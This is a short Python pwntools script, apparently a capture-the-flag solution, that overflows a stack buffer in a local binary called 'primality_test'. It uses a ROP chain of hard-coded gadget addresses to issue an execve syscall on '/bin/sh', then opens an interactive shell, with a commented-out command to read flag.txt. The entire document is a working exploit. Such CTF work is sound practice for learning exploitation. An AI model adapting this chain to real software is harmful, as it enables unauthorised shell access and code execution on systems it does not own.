from pwn import *

EXE_FILENAME = "./primality_test"
io = process(EXE_FILENAME)

exe = ELF(EXE_FILENAME)

POP_EAX_INT = 0x08048606  # pop eax; int 0x80;
POP_EBX_ECX = 0x08048609  # pop ebx; pop ecx; ret;
POP_EDX = 0x0804860c  # pop edx; ret;
BIN_SH = 0x08048991  # "/bin/sh"

chain = (b'A'*(0x4c + 4) + p32(POP_EBX_ECX) + p32(BIN_SH) + p32(0) + p32(POP_EDX) + p32(0) + p32(POP_EAX_INT) + p32(11))

print(chain[80:])
io.sendlineafter(b'Enter a number: ', chain)

io.interactive()

# io.sendline(b'cat flag.txt')
# print(io.clean().decode())
